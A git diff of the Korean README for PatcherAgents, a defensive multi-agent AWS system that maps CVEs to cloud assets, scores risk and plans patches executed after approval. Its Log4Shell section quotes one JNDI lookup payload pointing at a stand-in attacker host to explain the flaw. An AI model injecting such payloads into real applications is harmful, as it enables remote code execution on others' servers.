@@ -1,607 +1,737 @@
 # PatcherAgents
 
-AWS Bedrock AgentCore 위에서 여러 보안 에이전트를 연결해, 취약점 수집부터 자산 조사, 위험도 평가, 패치 전략 판단, 최종 패치 실행까지 이어지는 멀티 에이전트 파이프라인입니다.
+> 공개된 취약점이 실제 클라우드 자산에 어떤 영향을 주는지 AI 에이전트들이 자동으로 분석하고, 자산 식별부터 위험도 평가, 패치 전략 수립 및 실행까지 연결하는 멀티 에이전트 기반 보안 대응 자동화 시스템입니다.
 
-현재 저장소의 중심은 `MultiAIagent/` 이고, 실제 로컬 실행은 보통 `MultiAIagent/run_orchestrator_runtime.py`로 시작합니다.
+## 프로젝트 개요
 
-## 현재 파이프라인
-
-현재 기본 흐름은 아래와 같습니다.
+PatcherAgents는 클라우드 환경에서 공개된 취약점에 대해 다음 과정을 자동화하는 프로젝트입니다.
 
 ```text
-vuln_collector -> asset_matching -> risk_evaluation -> patch_impact -> patch_exec
+취약점 정보 수집
+→ 영향받는 클라우드 자산 식별
+→ 자산별 실제 위험도 평가
+→ 운영 영향을 고려한 패치 전략 수립
+→ 필요 시 승인 기반 패치 실행
 ```
 
-각 단계 역할은 이렇습니다.
+새로운 CVE가 주어지면 시스템은 먼저 취약점의 영향 범위, 악용 조건, 패치 및 완화 정보를 구조화합니다.
 
-- `vuln_collector`
-  CVE를 수집하고 다음 단계에서 바로 쓸 수 있는 payload를 만듭니다.
-- `asset_matching`
-  현재 스택/인프라에서 어떤 자산이 영향을 받는지 수집하고, 필요 시 개별 질문에 대한 direct fact를 다시 확인합니다.
-- `risk_evaluation`
-  취약점과 자산 컨텍스트를 합쳐 위험도를 계산합니다.
-- `patch_impact`
-  위험도 기반으로 패치 전략을 판단하고, 정보가 부족하면 asset agent에 직접 기술 사실을 물어 최종 조치를 정합니다.
-- `patch_exec`
-  선택된 조치를 실제 실행 단계로 넘기거나 실행 결과를 정리합니다.
+이후 현재 AWS 인프라에서 어떤 서버와 소프트웨어가 실제로 영향을 받는지 조사하고, 자산의 네트워크 노출 상태, 실행 권한, 설치 버전, 서비스 구성 등을 바탕으로 자산별 위험도를 평가합니다.
 
-현재 오케스트라는 이 단계를 순서대로 이어주는 얇은 실행 허브입니다.
+마지막으로 단순히 위험도가 높다는 이유만으로 즉시 패치를 결정하지 않고, 다음 요소를 함께 고려해 최종 대응 전략을 생성합니다.
 
-## 실행 환경과 모델 정책
+- 현재 자산에서 실제 취약 버전이 사용 중인지
+- 외부 입력이 취약 기능까지 도달할 수 있는지
+- 정식 패치 또는 버전 업그레이드가 가능한지
+- 서비스 재시작이나 재배포가 필요한지
+- 패치가 운영 중단이나 의존성 충돌을 일으킬 수 있는지
+- 정식 패치 전 적용 가능한 임시 완화책이 있는지
+- 추가 기술 사실 확인 또는 사람 검토가 필요한지
 
-현재 로컬 실행과 배포 스크립트가 기본으로 참조하는 환경변수 파일은 아래 하나입니다.
+즉, PatcherAgents는 단순히 CVE 정보를 조회하는 도구가 아니라 다음 질문에 답하는 시스템입니다.
 
-- [\.env](/Users/jms/Desktop/project/PacherAgents/.env)
+> 이 취약점이 현재 우리 클라우드 환경에서 실제로 어떤 의미가 있으며, 지금 어떤 조치를 취해야 하는가?
 
-즉 `MultiAIagent/` 내부 별도 `.env`를 두는 전제가 아니라, **프로젝트 루트 `.env`**를 기준으로 맞추는 것이 현재 기준입니다.
+---
 
-최소한 아래 값들은 루트 `.env`에 있어야 합니다.
+## 주제 선정 배경
 
-- `OPENCVE_API_KEY`
-- `AWS_ACCESS_KEY_ID`
-- `AWS_SECRET_ACCESS_KEY`
-- `AWS_DEFAULT_REGION`
-- 각 AgentCore runtime ARN 관련 변수
+최근 생성형 AI는 공격자의 생산성을 높이는 보조 도구를 넘어, 정찰, 취약점 탐색, 공격 코드 작성, 데이터 분석과 같은 공격 과정 전반을 빠르게 수행하는 데 활용되고 있습니다.
 
-중요:
-
-- 현재 멀티 에이전트 실습 경로는 **Amazon Bedrock 기반**으로 맞춰져 있습니다.
-
-## 개념 파이프라인 예시
-
-사용자 호출을 아주 단순화해서 보면 아래처럼 이해할 수 있습니다.
+공격 측의 탐색과 자동화 속도가 빨라지는 상황에서 방어 측 역시 공개된 취약점에 대해 다음 작업을 더 빠르게 수행할 필요가 있다고 판단했습니다.
 
 ```text
-사용자 호출 예시: { "stack_name": "megathon" }
-  - mode 생략 시 기본값은 full
-  - region 생략 시 기본값은 ap-northeast-2
-
-        │
-        ▼
-┌─────────────────────────────────────────┐
-│           orchestrator_agent            │
-│        파이프라인 총괄 / 라우팅          │
-└─────────────────────────────────────────┘
-        │
-        │ Step 0: orchestrator가 vuln 호출
-        ▼
-┌─────────────────────────────────────────┐
-│         vuln_collector_agent            │
-│                                         │
-│  반환:                                  │
-│  - raw_dataset                          │
-│  - risk_assessment_payload              │──→ risk 평가용
-│  - operational_impact_payload           │──→ patch 판단용
-│  - asset_matching_payload               │──→ 자산 수집용
-└─────────────────────────────────────────┘
-        │
-        │ Step 1: orchestrator가
-        │         asset_matching_payload를 받아
-        │         asset stage 입력으로 전달
-        ▼
-┌─────────────────────────────────────────┐
-│         infra_matching_agent            │
-│                                         │
-│  1. stack_name 기준으로 인프라 대상 탐색 │
-│  2. EC2 / 네트워크 / 보안 정보 수집      │
-│  3. SSM으로 소프트웨어/설정 정보 조회    │
-│                                         │
-│  반환: infra_context                    │
-└─────────────────────────────────────────┘
-        │
-        │ Step 2: orchestrator가
-        │         risk_assessment_payload + infra_context를 묶어
-        │         risk stage 입력으로 전달
-        ▼
-┌─────────────────────────────────────────┐
-│        risk_evaluation_agent            │
-│                                         │
-│  1. 취약점 payload와 자산 컨텍스트 결합  │
-│  2. 운영/노출/권한 조건 반영             │
-│  3. 위험도 산정                         │
-│                                         │
-│  반환: risk_result                      │
-└─────────────────────────────────────────┘
-        │
-        │ Step 3: orchestrator가
-        │         operational_payload + infra_context + risk_result를 묶어
-        │         patch stage 입력으로 전달
-        ▼
-┌─────────────────────────────────────────┐
-│         patch_impact_agent              │
-│                                         │
-│  1. risk를 시작점으로 기본 patch 전략 수립│
-│  2. infra + operational로 필드 직접 채움 │
-│  3. 부족한 direct fact만 asset에 질문    │
-│  4. 최종 patch strategy 결과 생성       │
-│                                         │
-│  반환: patch_strategy_result            │
-└─────────────────────────────────────────┘
-        │
-        │ Step 4: orchestrator가
-        │         patch strategy 결과를 patch execution에 전달
-        ▼
-┌─────────────────────────────────────────┐
-│          patch_exec_agent               │
-│                                         │
-│  1. 선택된 조치 기준 실행 단계 구성      │
-│  2. 실행 또는 실행 계획 정리             │
-│                                         │
-│  반환: patch_execution_result           │
-└─────────────────────────────────────────┘
+CVE 분석
+→ 보유 자산과의 연관성 확인
+→ 실제 악용 가능성 평가
+→ 우선순위 결정
+→ 패치 및 완화 전략 수립
 ```
 
-## 단계별 입력 / 산출물
+기존 취약점 대응 과정에서는 보안 담당자가 여러 시스템을 오가며 다음 정보를 수동으로 결합해야 합니다.
 
-| 단계 | 호출 대상 | 오케스트라 입력 | 대표 산출물 | 다음 단계로 넘기는 값 |
-| --- | --- | --- | --- | --- |
-| vuln | `vuln_collector_agent` | 별도 단계 입력 없음 | `raw_result`, `risk_assessment_payload`, `operational_impact_payload`, `asset_matching_payload` | asset, risk, patch |
-| asset | `infra_matching_agent` | `stack_name`, `region`, `asset_matching_payload` | `infra_context` | risk, patch |
-| risk | `risk_evaluation_agent` | `region`, `infra_context`, `risk_assessment_payload` | `risk_result` | patch |
-| patch | `patch_impact_agent` | `region`, `infra_context`, `risk_result`, `operational_payload` | `patch_strategy_result` | patch_exec, 최종 응답 |
-| patch_exec | `patch_exec_agent` | `patch_strategy_result` 또는 patch execution payload | `patch_execution_result` | 최종 응답 |
+- 공개 CVE 정보
+- 영향받는 제품과 버전
+- 클라우드 자산 목록
+- 실제 설치된 소프트웨어
+- 네트워크 노출 상태
+- 서비스 실행 권한
+- 운영 중요도
+- 패치 및 재배포 영향
 
-표에서 자주 나오는 값은 아래처럼 이해하면 됩니다.
+PatcherAgents는 이 과정을 역할별 AI 에이전트로 분리하여, 각 에이전트가 전문적인 판단을 수행하고 결과를 다음 단계로 전달하도록 설계했습니다.
 
-- `raw_result`: vuln 단계의 원본 취약점 수집 결과입니다.
-- `risk_assessment_payload`: risk 단계가 바로 읽을 수 있게 정리한 취약점 payload입니다.
-- `operational_payload`: patch 단계가 정식 패치, 임시 완화, 검증 항목을 판단할 때 참고하는 patch 전략 힌트 payload입니다.
-- `asset_matching_payload`: asset 단계가 어떤 자산을 볼지 판단할 때 쓰는 기준 payload입니다.
-- `infra_context`: 실제 인프라, 인스턴스, 소프트웨어, 네트워크 정보를 모아둔 컨텍스트입니다.
-- `risk_result`: risk 단계가 계산한 위험도 평가 결과입니다.
-- `patch_strategy_result`: patch 단계의 최종 판단 결과입니다.
-- `patch_execution_result`: patch 실행 단계의 결과 또는 실행 계획입니다.
+---
 
-## 에이전트별 역할과 전달 데이터
+## 전체 시스템 아키텍처
 
-| 에이전트 | 핵심 역할 | 주로 받는 데이터 | 주로 넘기는 데이터 |
+![PatcherAgents 전체 구조도](../image/OverallStructure.png)
+
+### 데이터 전달 관계
+
+각 에이전트는 하나의 직전 결과만 받는 것이 아니라, 판단에 필요한 여러 결과를 함께 사용합니다.
+
+```text
+취약점 수집 Agent
+├─ asset_matching_payload
+│        └─ 자산 매칭 Agent 입력
+│
+├─ risk_assessment_payload
+│        └─ 위험도 평가 Agent 입력
+│
+└─ operational_payload
+         └─ 패치 전략 Agent 입력
+```
+
+```text
+자산 매칭 Agent
+입력
+└─ asset_matching_payload
+
+출력
+└─ infra_context
+```
+
+```text
+위험도 평가 Agent
+입력
+├─ risk_assessment_payload
+└─ infra_context
+
+출력
+└─ risk_result
+```
+
+```text
+패치 전략 Agent
+입력
+├─ risk_result
+├─ infra_context
+└─ operational_payload
+
+출력
+└─ patch_strategy_result
+```
+
+```text
+패치 실행 Agent
+입력
+├─ patch_strategy_result
+└─ 관리자 승인 정보
+
+출력
+└─ 패치 명령 실행 및 검증 결과
+```
+
+---
+
+## 핵심 설계 원칙
+
+### 1. 취약점 중심이 아닌 자산 중심 평가
+
+동일한 CVE라도 모든 서버가 동일한 위험도를 가지지는 않습니다.
+
+PatcherAgents는 다음 정보를 결합해 자산별 위험도를 별도로 계산합니다.
+
+```text
+CVE 자체 위험도
++ 실제 설치 버전
++ 취약 기능 사용 여부
++ 외부 입력 도달 가능성
++ 네트워크 노출
++ 실행 권한
++ 자산 중요도
++ 완화 통제 존재 여부
+```
+
+예를 들어 동일한 nginx 취약 버전이라도 인터넷에 직접 노출되고 root 권한으로 실행되는 서버와 내부망에서만 사용되는 서버는 서로 다른 우선순위를 가집니다.
+
+### 2. 사실 수집과 의사결정의 분리
+
+자산 매칭 에이전트는 실제 환경에서 관측할 수 있는 기술 사실을 수집합니다.
+
+```text
+설치된 버전
+실행 프로세스
+열린 포트
+설정 파일
+서비스 실행 권한
+배포 방식
+네트워크 노출 상태
+```
+
+위험도 평가 및 패치 전략 에이전트는 이 사실을 근거로 판단합니다.
+
+```text
+위험도
+패치 가능성
+운영 영향
+완화책
+최종 대응 방식
+```
+
+이를 통해 사실 수집 에이전트가 패치 여부를 임의로 결정하거나, 의사결정 에이전트가 확인되지 않은 자산 상태를 추측하는 것을 줄입니다.
+
+### 3. 필요한 사실만 추가 질의
+
+패치 전략 에이전트는 기존 입력만으로 판단하기 어려운 경우 자산 매칭 에이전트에 추가 질문을 보낼 수 있습니다.
+
+예시:
+
+```text
+현재 실행 중인 Java 프로세스가 취약 Log4j JAR를 실제로 참조하는가?
+```
+
+```text
+nginx가 OS 패키지로 설치되었는가, 직접 컴파일된 바이너리인가?
+```
+
+```text
+패치 적용 후 서비스 재시작 또는 애플리케이션 재배포가 필요한가?
+```
+
+추가 질의는 record별 횟수와 실행 시간 제한을 적용하여 무제한 호출을 방지합니다.
+
+### 4. 보수적 Fallback
+
+모델 응답이 불완전하거나 근거가 부족한 경우, 해당 자산을 결과에서 제거하지 않습니다.
+
+대신 다음과 같은 보수적 결과를 생성합니다.
+
+```json
+{
+  "selected_action": "human_review",
+  "confidence": "low",
+  "remaining_unknowns": [
+    "insufficient_evidence"
+  ]
+}
+```
+
+이를 통해 모델 오류로 인해 위험 자산이 최종 보고서에서 누락되는 것을 방지합니다.
+
+### 5. Human-in-the-Loop
+
+실제 서버 변경으로 이어질 수 있는 조치는 자동 판단 결과만으로 실행하지 않습니다.
+
+패치 실행 단계에서는 다음 항목을 별도로 확인합니다.
+
+- 대상 자산
+- CVE와 패치 전략의 일치 여부
+- 관리자 승인 상태
+- 허용된 패치 방식
+- 실행 명령 검증
+- Rollback 계획
+- 패치 후 검증 항목
+
+---
+
+## 에이전트 구성
+
+| Agent | 주요 역할 | 대표 입력 | 대표 출력 |
 | --- | --- | --- | --- |
-| `vuln_collector_agent` | 취약점 원본 수집 + 후속 단계용 payload 생성 | `stack_name`, `region`, 외부 취약점 데이터셋 | `risk_assessment_payload`, `operational_impact_payload`, `asset_matching_payload` |
-| `infra_matching_agent` | 자산/인프라 수집, 소프트웨어/설정/네트워크 사실 확인 | `stack_name`, `asset_matching_payload`, 개별 `question` + `asset_info` | `infra_context`, direct fact 응답 |
-| `risk_evaluation_agent` | 취약점과 자산 컨텍스트를 합쳐 위험도 계산 | `risk_assessment_payload`, `infra_context` | `risk_result` |
-| `patch_impact_agent` | 위험도 기반 patch 전략 판단, 부족한 direct fact만 asset에 질문 | `risk_result`, `infra_context`, `operational_payload`, 기존 asset fact 응답 | `patch_strategy_result`, `PatchToAsset` 대화 로그 |
-| `patch_exec_agent` | 선택된 조치의 실제 실행 | `patch_strategy_result` 또는 patch execution payload | 실행 결과, 검증 결과 |
-| `orchestrator_agent` | 각 AgentCore runtime 호출, 단계 연결, 결과 저장 | `mode`, `region`, 각 단계 입력 payload | `pipeline_result`, 단계 wrapper 결과 |
+| Orchestrator Agent | 전체 파이프라인 순서 제어 및 Agent 간 데이터 전달 | 사용자 요청, 실행 모드 | 전체 실행 결과 |
+| Vulnerability Collector Agent | CVE 정보 수집 및 후속 Agent별 Payload 생성 | CVE ID | `asset_matching_payload`, `risk_assessment_payload`, `operational_payload` |
+| Asset Matching Agent | AWS 자산 탐색 및 실제 소프트웨어·네트워크·보안 정보 수집 | `asset_matching_payload` | `infra_context` |
+| Risk Evaluation Agent | CVE 정보와 실제 자산 상태를 결합해 자산별 위험도 계산 | `risk_assessment_payload`, `infra_context` | `risk_result` |
+| Patch Strategy Agent | 위험도, 자산 정보, 운영 영향을 결합해 최종 대응 전략 결정 | `risk_result`, `infra_context`, `operational_payload` | `patch_strategy_result` |
+| Patch Execution Agent | 승인된 패치 또는 완화 조치를 실제 대상에 실행하고 결과 확인 | `patch_strategy_result`, 승인 정보 | 실행 및 검증 결과 |
 
-Patch 단계에서 특히 중요한 전달 관계는 아래처럼 이해하면 됩니다.
+---
 
-- `risk_result`
-  patch 전략의 시작점입니다. 위험도가 높을수록 `apply_patch_now` 또는 `apply_mitigation_now` 쪽으로 기울 수 있습니다.
-- `infra_context`
-  현재 자산의 설치 소프트웨어, 네트워크 노출, 실행 상태, 설정 흔적 같은 직접 사실의 기본 근거입니다.
-- `operational_payload`
-  정식 패치 방법, 가능한 완화책, validation 체크리스트를 주는 참고 payload입니다.
-- `PatchToAsset` direct fact query
-  위 3개만으로 특정 필드를 채우기 부족할 때만 patch가 asset에 질문합니다.
-  이 질문은 운영 정책이 아니라 직접 관측 가능한 기술 사실 확인에만 사용합니다.
+## 에이전트별 처리 흐름
+
+### Vulnerability Collector Agent
+
+공개된 CVE 정보를 수집하고, 각 후속 에이전트가 바로 사용할 수 있는 목적별 Payload를 생성합니다.
+
+```text
+CVE 입력
+   │
+   ├─ 영향받는 제품 및 버전
+   ├─ 악용 조건
+   ├─ 수정 버전
+   ├─ 자산 확인 항목
+   ├─ 패치 유형
+   ├─ 의존성 및 운영 영향
+   └─ 임시 완화책
+```
+
+출력:
+
+```text
+asset_matching_payload
+risk_assessment_payload
+operational_payload
+```
+
+### Asset Matching Agent
+
+AWS VPC 안의 EC2 자산을 탐색하고, AWS Systems Manager를 통해 각 인스턴스의 실제 상태를 조사합니다.
+
+수집 대상:
+
+```text
+설치된 소프트웨어 및 버전
+실행 중인 프로세스
+열린 포트
+Public/Private 네트워크 노출
+Security Group
+IAM Role
+IMDSv2 적용 여부
+서비스 실행 권한
+설정 파일과 설치 경로
+```
+
+출력:
+
+```text
+infra_context
+```
+
+### Risk Evaluation Agent
+
+취약점 수집 결과와 자산 매칭 결과를 결합하여 각 자산의 실제 위험도를 산정합니다.
+
+```text
+risk_assessment_payload
+          +
+infra_context
+          ↓
+asset_id × cve_id 위험도 평가
+```
+
+평가 결과에는 다음 항목이 포함될 수 있습니다.
+
+- 자산별 계산 위험도
+- 외부 노출 수준
+- 실제 악용 조건 충족 여부
+- 위험도를 높이거나 낮춘 근거
+- 권장 조치
+
+출력:
+
+```text
+risk_result
+```
+
+### Patch Strategy Agent
+
+위험도 결과, 자산 정보, 운영 영향 정보를 함께 보고 자산별 최종 대응 전략을 결정합니다.
+
+```text
+risk_result
+      +
+infra_context
+      +
+operational_payload
+      ↓
+patch_strategy_result
+```
+
+선택 가능한 주요 전략:
+
+| 전략 | 의미 |
+| --- | --- |
+| `apply_patch_now` | 정식 패치를 즉시 적용 |
+| `apply_patch_planned` | 계획된 변경 일정에 정식 패치 적용 |
+| `apply_mitigation_now` | 정식 패치 전 임시 완화 조치 우선 적용 |
+| `human_review` | 근거 부족 또는 운영 불확실성으로 사람 검토 필요 |
+
+### Patch Execution Agent
+
+승인된 패치 전략을 실제 실행 단계로 전환합니다.
+
+주요 처리:
+
+```text
+패치 전략 수신
+→ 대상 자산 및 CVE 확인
+→ 자동 실행 또는 관리자 승인 분류
+→ AWS SSM을 통한 실행
+→ 실행 상태 확인
+→ 패치 후 검증
+→ 결과 반환
+```
+
+실제 운영 서버의 변경으로 이어질 수 있으므로, 격리된 실습 환경과 승인 절차를 전제로 합니다.
+
+---
+
+## Frontend
+
+프론트엔드는 멀티 에이전트 파이프라인을 실행하고 결과를 시각적으로 확인하기 위한 데모 인터페이스입니다.
+
+기술 구성:
+
+```text
+React
+TypeScript
+Vite
+pnpm
+```
+
+### Workflow
+
+전체 파이프라인 실행 화면입니다.
+
+- 실행 모드 선택
+- Stack 이름 입력
+- AWS Region 설정
+- CVE ID 지정
+- 실행 진행 상태 표시
+- 실제 변경 가능 모드에 대한 안전 확인 팝업
+
+### Result
+
+일반 사용자와 보안 담당자를 위한 결과 화면입니다.
+
+- 에이전트별 처리 결과
+- 취약점과 영향 자산
+- 위험도 평가 근거
+- 선택된 패치 전략
+- 처리 단계별 타임라인
+- 결과 생성 시각
+
+### Dev
+
+개발자용 원본 데이터 확인 화면입니다.
+
+- Agent별 입력 JSON
+- Agent별 출력 JSON
+- Agent 간 전달 데이터
+- 추가 자산 질의 내역
+- 오케스트레이션 흐름
+- 대화 및 Follow-up 기록
+
+---
+
+## 실행 모드
+
+| 모드 | 설명 |
+| --- | --- |
+| `Vuln` | 취약점 수집 에이전트만 실행 |
+| `Asset` | 기존 취약점 Payload를 사용해 자산 매칭 실행 |
+| `Risk` | 기존 취약점 및 자산 결과를 사용해 위험도 평가 실행 |
+| `Patch` | 기존 위험도 및 운영 영향 결과를 사용해 패치 전략 생성 |
+| `Exec 전` | 취약점 수집부터 패치 전략까지 실행하고 실제 패치 실행은 차단 |
+| `Exec` | 실제 패치 실행 단계까지 포함 가능 |
+| `Full` | 전체 파이프라인 실행 |
+| `Test` | 특정 단계의 입력을 주입해 개별 흐름 테스트 |
+
+데모 환경에서는 실제 서버 변경을 방지하면서 전체 판단 흐름을 보여줄 수 있는 `Exec 전` 모드를 권장합니다.
+
+---
+
+## 선정 취약점
+
+현재 데모 시나리오는 다음 두 가지 취약점을 중심으로 구성되어 있습니다.
+
+### CVE-2021-23017 — nginx Resolver Off-by-One
+
+![nginx Resolver Off-by-One 구조도](../image/nginxResolverVulnStructure.png)
+
+nginx가 DNS 응답의 이름을 복원하는 과정에서 발생하는 off-by-one 메모리 오류입니다.
+
+프로젝트의 실습 환경에서는 `/app/` Reverse Proxy 요청을 처리할 때 nginx가 내부 DNS 질의를 수행하도록 구성했습니다.
+
+공격자가 조작된 DNS 응답을 전달할 수 있는 조건에서는 `ngx_resolver_copy()` 처리 과정에서 버퍼 범위를 벗어난 1바이트 쓰기가 발생할 수 있습니다.
+
+가능한 영향:
+
+```text
+nginx Worker Process 비정상 종료
+반복적인 프로세스 장애
+서비스 가용성 저하
+Denial of Service
+```
+
+분석 시 주요 확인 항목:
+
+- nginx 버전
+- Resolver 기능 사용 여부
+- 실제 DNS 처리 발생 여부
+- nginx 실행 권한
+- 인터넷 노출 여부
+- 패키지 설치 또는 직접 컴파일 여부
+- 업그레이드 후 서비스 재시작 영향
+
+### CVE-2021-44228 — Log4Shell
+
+![Log4Shell 구조도](../image/Log4jShellVulnStructure.png)
+
+Log4Shell은 공격자가 다음과 같은 JNDI Lookup 표현식을 애플리케이션 입력으로 전달했을 때 발생할 수 있는 취약점입니다.
+
+```text
+${jndi:ldap://attacker.example/resource}
+```
+
+취약한 Log4j 버전이 해당 입력을 로그에 기록하면 이를 일반 문자열이 아니라 Lookup 표현식으로 처리할 수 있습니다.
+
+그 결과 서버가 외부 JNDI 또는 LDAP 서버에 연결하며, 환경에 따라 다음 영향으로 이어질 수 있습니다.
+
+```text
+환경 정보 유출
+외부 네트워크 통신
+악성 객체 또는 클래스 로딩
+원격 코드 실행
+서버 권한 탈취
+```
+
+분석 시 주요 확인 항목:
+
+- Log4j 버전
+- 실제 애플리케이션 Classpath 포함 여부
+- 외부 입력이 로그에 기록되는지
+- JndiLookup 구성요소 존재 여부
+- 애플리케이션 실행 권한
+- 네트워크 Egress 가능 여부
+- 라이브러리 교체 후 재빌드 또는 재배포 필요 여부
+
+---
+
+## 주요 산출물
+
+| 산출물 | 설명 |
+| --- | --- |
+| `asset_matching_payload.json` | 자산 매칭 에이전트가 확인해야 할 제품, 버전 및 자산 조건 |
+| `risk_assessment_payloads.json` | 위험도 평가에 필요한 취약점 영향 및 악용 조건 |
+| `operational_impact_payloads.json` | 패치 방식, 운영 영향, 의존성 및 완화 조치 |
+| `infra_context.json` | 자산별 소프트웨어, 네트워크, 보안 및 배포 정보 |
+| `risk_evaluation_result.json` | 자산별 최종 위험도와 평가 근거 |
+| `patch_strategy_result.json` | 자산별 최종 패치 또는 완화 전략 |
+| `asset_fact_trace.json` | 패치 전략 단계에서 수행한 추가 자산 질의 기록 |
+| Patch Execution Result | 패치 실행 명령, 상태 및 검증 결과 |
+
+실행 결과는 기본적으로 다음 디렉터리에 생성됩니다.
+
+```text
+MultiAIagent/OchestraResult/
+```
+
+이 디렉터리에는 실제 AWS 자산 ID, IP 주소, ARN, 설정 정보가 포함될 수 있으므로 Git에 커밋하지 않습니다.
+
+---
+
+## 기술 스택
+
+| 영역 | 기술 |
+| --- | --- |
+| Frontend | React, TypeScript, Vite, pnpm |
+| Agent Framework | Strands Agents |
+| LLM | Amazon Bedrock |
+| Runtime | Amazon Bedrock AgentCore |
+| Backend | Python |
+| Schema Validation | Pydantic |
+| Cloud | AWS |
+| Infrastructure | VPC, EC2, Security Group, IAM, CloudFormation |
+| Remote Execution | AWS Systems Manager |
+| Agent Communication | JSON Payload, AgentCore Runtime Invocation |
+| Approval | Human-in-the-Loop, Slack 연동 |
+| Output | JSON 기반 Agent별 중간·최종 산출물 |
+
+---
 
 ## 저장소 구조
 
 ```text
-PacherAgents/
-├── MultiAIagent/
-│   ├── OchestratorAgent(AWS)/
-│   ├── VulnCollectorAgent(AWS)/
-│   ├── Infra_matchingAgent(AWS)/
-│   ├── Risk_evaluation_agent(AWS)/
-│   ├── PatchStrategyAgent(AWS)/
-│   ├── PatchExecAgent(AWS)/
-│   ├── OchestraResult/
-│   ├── Conversationlog/
-│   ├── scripts/
-│   └── run_orchestrator_runtime.py
-├── InfraSubjectTo Vulnerability Inspection/
-├── image/
-└── README.md
+PatcherMultiAiagentProject/
+├─ README.md
+│
+├─ frontend/
+│  ├─ src/
+│  ├─ vite.config.ts
+│  └─ README.md
+│
+├─ image/
+│  └─ PatcherAgentsOverallStructure.png
+│
+├─ MultiAIagent/
+│  ├─ README.md
+│  ├─ run_orchestrator_runtime.py
+│  │
+│  ├─ OrchestratorAgent(AWS)/
+│  ├─ VulnCollectorAgent(AWS)/
+│  ├─ Infra_matchingAgent(AWS)/
+│  ├─ Risk_evaluation_agent(AWS)/
+│  ├─ PatchStrategyAgent(AWS)/
+│  ├─ PatchExecAgent(AWS)/
+│  │
+│  ├─ scripts/
+│  ├─ OchestraResult/
+│  └─ Conversationlog/
+│
+├─ InfraSubjectTo Vulnerability Inspection/
+│  └─ CloudFormation 기반 취약 인프라 실습 환경
+│
+├─ aws_backup/
+│  └─ 비식별화된 AWS IAM 및 구성 참고 자료
+│
+└─ .gitignore
 ```
 
-### 주요 폴더
+`OchestraResult`와 `Conversationlog`는 실행 시 생성되는 로컬 데이터이며 공개 저장소에 포함하지 않습니다.
 
-- `MultiAIagent/`
-  실제 멀티 에이전트 구현, 런타임 소스, 실행기, 결과 저장 폴더가 들어 있습니다.
-- `InfraSubjectTo Vulnerability Inspection/`
-  실습용 인프라 템플릿과 점검 대상 코드/리소스를 두는 영역입니다.
-- `image/`
-  구조도 등 문서용 이미지 리소스입니다.
+---
 
-## 주요 런타임 소스
+## 상세 문서
 
-### `OchestratorAgent(AWS)`
+- [멀티 에이전트 파이프라인](./MultiAIagent/README.md)
+- [Frontend](./frontend/README.md)
+- [취약점 수집 에이전트](<./MultiAIagent/VulnCollectorAgent(AWS)/README.md>)
+- [자산 매칭 에이전트](<./MultiAIagent/Infra_matchingAgent(AWS)/README.md>)
+- [패치 전략 에이전트](<./MultiAIagent/PatchStrategyAgent(AWS)/README.md>)
+- [패치 실행 에이전트](<./MultiAIagent/PatchExecAgent(AWS)/README.md>)
 
-오케스트라 runtime 소스입니다.
+---
 
-주요 파일:
+## 실행 준비
 
-- `main.py`
-  AgentCore entrypoint
-- `orchestrator_pipeline.py`
-  실행 모드 분기와 전체 흐름 제어
-- `pipeline_stages.py`
-  vuln / asset / risk / patch / patch_exec 각 단계 실행 함수
-- `runtime_agents.py`
-  다른 AgentCore runtime ARN 호출 레이어
+### 저장소 복제
 
-현재 성격:
-
-- 얇은 순차 파이프라인
-- `full`, `vuln_only`, `asset_only`, `risk_only`, `patch_only`, `test`, `patch_exec_only` 지원
-- 앞 단계 결과를 다음 단계로 넘기는 역할 담당
-
-### `VulnCollectorAgent(AWS)`
-
-취약점 수집 runtime 소스입니다.
-
-주요 파일:
-
-- `runtime_app.py`
-- `vuln_collector_agent/`
-
-현재 역할:
-
-- CVE raw 결과 생성
-- `risk_assessment_payloads.json`
-- `operational_impact_payloads.json`
-- `asset_matching_payload.json`
-
-즉 뒤 단계가 바로 쓸 수 있는 취약점 payload를 만드는 역할입니다.
-
-### `PatchStrategyAgent(AWS)`
-
-패치 전략 판단 runtime 소스입니다.
-
-중요:
-
-- 현재 patch는 ZIP runtime이 아니라 container runtime 기준으로 운용합니다.
-- 예전 `pre/followup/final` 외부 단계 분할이 아니라, `patch_actions.py` 한 파일 중심의 단일 planner 구조입니다.
-
-주요 파일:
-
-- `runtime_app.py`
-  patch runtime 진입점
-- `patch_runtime/patch_actions.py`
-  patch 전략 planner 본체
-- `container_server.py`
-  AgentCore container runtime용 HTTP wrapper
-- `Dockerfile`
-  container 이미지 정의
-- `build_and_push_container.sh`
-  ECR build/push
-- `deploy_container_runtime.sh`
-  AgentCore container runtime update
-
-현재 patch는 `patch_actions.py` 한 파일 안에서 아래를 모두 처리합니다.
-
-- `risk_result`, `infra_context`, `operational_payload`를 직접 읽음
-- 최종 출력 스키마의 각 필드를 직접 채우려 함
-- 기존 자료만으로 부족한 필드가 있으면 `query_asset_fact` tool로 asset runtime에 직접 기술 사실 질문
-- 응답을 반영해 최종 `patch_strategy_result` 생성
-
-즉 지금 실제 에이전트 간 direct fact 대화에 제일 가까운 구간은 `patch -> asset` 질문입니다.
-
-### `PatchExecAgent(AWS)`
-
-패치 실행 runtime 소스입니다.
-
-현재 역할:
-
-- `patch_strategy_result`를 읽고 실행 단계 판단
-- 실제 명령 실행 또는 실행 계획 정리
-- patch execution 결과 산출
-
-## `run_orchestrator_runtime.py`
-
-경로:
-
-- `MultiAIagent/run_orchestrator_runtime.py`
-
-이 스크립트는 로컬에서 오케스트라 runtime을 호출하는 실행기입니다.
-
-역할:
-
-- 실행 모드 선택
-- 필요한 JSON 입력 자동 탐색
-- 오케스트라 runtime 1차 호출
-- 실행 결과를 `OchestraResult`에 저장
-- patch -> asset direct fact 질문이 있으면 `Conversationlog/PatchToAsset`에도 저장
-
-### 실행 원리
-
-호출 구조는 항상 아래와 같습니다.
-
-```text
-로컬 실행기
--> 오케스트라 runtime
--> 오케스트라가 하위 runtime들 호출
+```powershell
+git clone https://github.com/monkama/PatcherMultiAiagentProject.git
+cd PatcherMultiAiagentProject
 ```
 
-즉 `vuln_only`, `asset_only`, `risk_only`, `patch_only`, `full`, `test`, `patch_exec_only` 모두 기본 원리는 같습니다.
+### Python 가상환경
 
-차이는 오케스트라가 내부에서 어디까지 호출하느냐입니다.
-
-- `vuln_only`
-  vuln runtime만 호출
-- `asset_only`
-  asset runtime만 호출
-- `risk_only`
-  risk runtime만 호출
-- `patch_only`
-  patch runtime만 호출
-- `full`
-  vuln -> asset -> risk -> patch -> patch_exec 전체 호출
-- `test`
-  `test_inputs`와 `stop_stage` 기준으로 필요한 단계까지만 호출
